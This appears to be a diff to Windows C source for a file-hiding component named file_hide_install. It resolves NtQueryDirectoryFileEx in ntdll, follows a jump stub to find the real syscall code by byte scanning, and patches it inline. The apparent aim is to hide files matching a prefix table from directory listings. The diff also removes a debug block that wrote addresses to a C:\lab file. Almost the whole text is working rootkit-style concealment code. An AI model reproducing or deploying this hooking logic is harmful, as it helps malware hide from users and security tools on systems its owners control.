@@ -211,44 +211,28 @@ int file_hide_install(PrefixTable *table)
         GetProcAddress(ntdll, "NtQueryDirectoryFileEx");
     if (g_original_ex) {
         BYTE *ex_ptr = (BYTE *)g_original_ex;
-        void *resolved_target = (void *)g_original_ex;
 
         if (ex_ptr[0] == 0xE9) {
+            /* Forwarding stub → follow E9 JMP, then scan for the
+               actual syscall stub (4C 8B D1 B8 = mov r10,rcx;
+               mov eax,N).  Covers retpoline / CFG trampolines
+               with FF 25 + CC padding before the stub. */
             INT32 disp = *(INT32 *)(ex_ptr + 1);
-            resolved_target = ex_ptr + 5 + disp;
-        }
-
-#ifdef FILE_HIDE_DIAG
-        {
-            HANDLE hf = CreateFileA("C:\\lab\\debug_resolved.bin",
-                                    GENERIC_WRITE, 0, NULL,
-                                    CREATE_ALWAYS, 0, NULL);
-            if (hf != INVALID_HANDLE_VALUE) {
-                DWORD w;
-                BYTE info[48];
-                /* 0-7:  export address (NtQueryDirectoryFileEx) */
-                *(UINT_PTR *)(info +  0) = (UINT_PTR)ex_ptr;
-                /* 8-15: resolved target address */
-                *(UINT_PTR *)(info +  8) = (UINT_PTR)resolved_target;
-                /* 16-23: NtQueryDirectoryFile address (for comparison) */
-                *(UINT_PTR *)(info + 16) = (UINT_PTR)g_original;
-                /* 24-39: first 16 bytes at resolved target */
-                memcpy(info + 24, resolved_target, 16);
-                /* 40-47: first 8 bytes at export (the E9 stub) */
-                memcpy(info + 40, ex_ptr, 8);
-                WriteFile(hf, info, sizeof(info), &w, NULL);
-                CloseHandle(hf);
+            BYTE *region = ex_ptr + 5 + disp;
+            BYTE *stub = NULL;
+            for (int i = 0; i < 32; i++) {
+                if (region[i]   == 0x4C && region[i+1] == 0x8B &&
+                    region[i+2] == 0xD1 && region[i+3] == 0xB8) {
+                    stub = region + i;
+                    break;
+                }
             }
-            /* DIAG: skip Ex hook installation entirely */
+            g_original_ex = stub ? (pNtQueryDirectoryFileEx)stub : NULL;
         }
-#else
-        g_original_ex = (pNtQueryDirectoryFileEx)resolved_target;
 
-        /* Skip if resolved target IS NtQueryDirectoryFile
-           (already hooked above). */
-        if ((void *)g_original_ex == (void *)g_original) {
+        /* Skip if the resolved stub IS NtQueryDirectoryFile. */
+        if (g_original_ex && (void *)g_original_ex == (void *)g_original)
             g_original_ex = NULL;
-        }
 
         if (g_original_ex) {
             memcpy(g_saved_ex, (void *)g_original_ex, PATCH_SIZE);
@@ -271,7 +255,6 @@ int file_hide_install(PrefixTable *table)
                 }
             }
         }
-#endif
     }
 
     return 0;
